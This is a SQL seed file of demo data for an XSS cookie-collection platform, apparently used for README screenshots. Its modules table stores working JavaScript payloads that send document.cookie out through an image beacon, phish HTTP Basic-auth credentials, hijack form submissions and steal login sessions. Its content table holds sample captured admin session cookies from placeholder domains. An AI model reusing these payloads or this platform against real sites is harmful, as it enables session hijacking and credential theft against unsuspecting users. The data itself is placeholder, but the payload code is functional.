SET NAMES utf8mb4;
-- Clean demo data used only for README screenshots (Playwright e2e).
DELETE FROM oc_project_content;
DELETE FROM oc_project;
DELETE FROM oc_module;
DELETE FROM oc_keepsession;
DELETE FROM oc_remind;
DELETE FROM oc_invite_reg;
DELETE FROM oc_session;
DELETE FROM oc_user WHERE id <> 2;

-- Keep the operator account, add a few demo accounts for the admin overview.
UPDATE oc_user SET email='admin@example.com' WHERE id=2;
INSERT INTO oc_user (id,userName,userPwd,email,adminLevel,validated,addTime) VALUES
 (3,'林小满','demo','lin@example.com',0,1,1700000000),
 (4,'周屿','demo','zhou@example.com',0,1,1700000100),
 (5,'陈默','demo','chen@example.com',0,1,1700000200);

INSERT INTO oc_module (id,userId,title,`keys`,setkeys,code,`level`,isOpen,description,isAudit,managerId,managerName,addTime)
VALUES
 (190,2,'通用收包','["location","toplocation","cookie","opener","useragent"]',NULL,'(function(){(new Image()).src=&quot;/index.php?do=api&amp;id={projectId}&amp;cookie=&quot;+escape(document.cookie);})();',0,1,'收集页面地址、Cookie、User-Agent 等基础信息',1,2,'admin',1700000000),
 (191,2,'基础认证钓鱼','["username","password"]','["info"]','x=new Image();x.src=&quot;/authtest.php?id={projectId}&amp;info={set.info}&quot;;',0,1,'针对 HTTP Basic 认证弹出登录框并回传凭据',1,2,'admin',1700000100),
 (192,2,'AJAX POST/GET 操作','[]',NULL,'var pkav={req:function(u,d){var x=new XMLHttpRequest();x.open(&quot;POST&quot;,u,true);x.send(d);}};',0,1,'常用请求封装，支持 GET / POST',1,2,'admin',1700000200),
 (193,2,'登录态劫持','["cookie","location"]',NULL,'(new Image()).src=&quot;/index.php?do=api&amp;id={projectId}&amp;cookie=&quot;+escape(document.cookie);',0,0,'项目定制的私有模块',0,2,'admin',1700000300),
 (195,3,'表单劫持','["form"]',NULL,'document.forms[0].action=&quot;/index.php?do=api&amp;id={projectId}&quot;;',0,1,'拦截后台表单提交并回传',0,3,'林小满',1700000400);

INSERT INTO oc_project (id,userId,title,description,modules,moduleSetKeys,code,urlKey,authCode,addTime)
VALUES
 (194,2,'后台管理系统','主站后台的 XSS 验证项目，收集登录态与页面跳转链路','[190,191,193]','[]','','demoK1','demoAuth00000000000000000000001',1700001000),
 (193,2,'订单系统','订单详情页的反射型验证','[190]','[]','','demoK2','demoAuth00000000000000000000002',1700000900),
 (192,2,'用户中心','个人资料页的存储型验证','[190,192]','[]','','demoK3','demoAuth00000000000000000000003',1700000800),
 (191,2,'支付回调','支付结果页的收包验证','[190]','[]','','demoK4','demoAuth00000000000000000000004',1700000700);

INSERT INTO oc_project_content (id,projectId,content,serverContent,domain,cookieHash,num,updateTime,addTime)
VALUES
 (193,194,'{"opener":"https:\/\/admin.example.com\/users","toplocation":"https:\/\/admin.example.com\/users\/42","location":"https:\/\/admin.example.com\/users\/42","cookie":"SESSION=1c7d5e2b; role=admin","useragent":"Mozilla\/5.0 (X11; Linux x86_64)"}','{"REMOTE_ADDR":"192.0.2.55","HTTP_USER_AGENT":"Mozilla\/5.0 (X11; Linux x86_64)","HTTP_REFERER":"https:\/\/admin.example.com\/users"}','admin.example.com','h193',1,1700001100,1700001100),
 (192,194,'{"opener":"","toplocation":"https:\/\/admin.example.com\/orders","location":"https:\/\/admin.example.com\/orders\/1024","cookie":"SESSION=8f3a9c2e; role=admin","useragent":"Mozilla\/5.0 (Macintosh; Intel Mac OS X 10_15_7)"}','{"REMOTE_ADDR":"198.51.100.7","HTTP_USER_AGENT":"Mozilla\/5.0 (Macintosh; Intel Mac OS X 10_15_7)","HTTP_REFERER":"https:\/\/admin.example.com\/orders"}','admin.example.com','h192',1,1700001050,1700001050),
 (191,194,'{"opener":"","toplocation":"https:\/\/admin.example.com\/dashboard","location":"https:\/\/admin.example.com\/dashboard","cookie":"SESSION=8f3a9c2e; role=admin","useragent":"Mozilla\/5.0 (Windows NT 10.0; Win64; x64)"}','{"REMOTE_ADDR":"203.0.113.24","HTTP_USER_AGENT":"Mozilla\/5.0 (Windows NT 10.0; Win64; x64)","HTTP_REFERER":"https:\/\/admin.example.com\/login"}','admin.example.com','h191',1,1700001000,1700001000),
 (190,194,'{"opener":"","toplocation":"https:\/\/shop.example.net\/cart","location":"https:\/\/shop.example.net\/cart","cookie":"cart=7c93; sid=aa12","useragent":"Mozilla\/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X)"}','{"REMOTE_ADDR":"203.0.113.90","HTTP_USER_AGENT":"Mozilla\/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X)","HTTP_REFERER":"https:\/\/shop.example.net\/"}','shop.example.net','h190',1,1700000700,1700000700),
 (195,193,'{"opener":"","toplocation":"https:\/\/shop.example.net\/checkout","location":"https:\/\/shop.example.net\/checkout","cookie":"cart=7c93; uid=1024","useragent":"Mozilla\/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X)"}','{"REMOTE_ADDR":"203.0.113.91","HTTP_USER_AGENT":"Mozilla\/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X)","HTTP_REFERER":"https:\/\/shop.example.net\/cart"}','shop.example.net','h195',1,1700000950,1700000950),
 (194,193,'{"opener":"","toplocation":"https:\/\/shop.example.net\/orders","location":"https:\/\/shop.example.net\/orders\/2024","cookie":"cart=7c93","useragent":"Mozilla\/5.0 (Linux; Android 14)"}','{"REMOTE_ADDR":"198.51.100.88","HTTP_USER_AGENT":"Mozilla\/5.0 (Linux; Android 14)","HTTP_REFERER":"https:\/\/shop.example.net\/orders"}','shop.example.net','h194',1,1700000900,1700000900),
 (196,192,'{"opener":"","toplocation":"https:\/\/portal.example.org\/profile","location":"https:\/\/portal.example.org\/profile\/88","cookie":"uid=88; theme=light","useragent":"Mozilla\/5.0 (Windows NT 10.0; Win64; x64)"}','{"REMOTE_ADDR":"203.0.113.120","HTTP_USER_AGENT":"Mozilla\/5.0 (Windows NT 10.0; Win64; x64)","HTTP_REFERER":"https:\/\/portal.example.org\/profile"}','portal.example.org','h196',1,1700000850,1700000850);
